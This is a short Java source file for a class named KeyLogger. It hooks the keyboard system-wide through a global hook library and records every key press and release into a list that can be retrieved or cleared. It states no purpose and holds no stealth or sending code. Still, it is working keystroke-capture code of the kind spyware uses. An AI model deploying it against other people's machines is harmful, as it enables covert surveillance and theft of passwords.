import java.util.Map.Entry;
import java.util.*;
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import java.awt.event.KeyEvent;
public class KeyLogger implements Runnable {
    ArrayList<String> keypresses;
    boolean active;
    boolean gathering;
    public KeyLogger() {
        keypresses = new ArrayList<String>();
        active=true;
        gathering=false;
    }
    public void run() {
        GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
        keyboardHook.addKeyListener(new GlobalKeyAdapter() {
            @Override 
    	    public void keyPressed(GlobalKeyEvent event) {
    	        keypresses.add("p:"+KeyEvent.getKeyText(event.getVirtualKeyCode()));
            }
            @Override 
            public void keyReleased(GlobalKeyEvent event) {
                keypresses.add("r:"+KeyEvent.getKeyText(event.getVirtualKeyCode()));
            }
        });
    }
    public ArrayList<String> retrieve() {
        return keypresses;
    }
    public void restart() {
        keypresses = new ArrayList<String>();
    }
}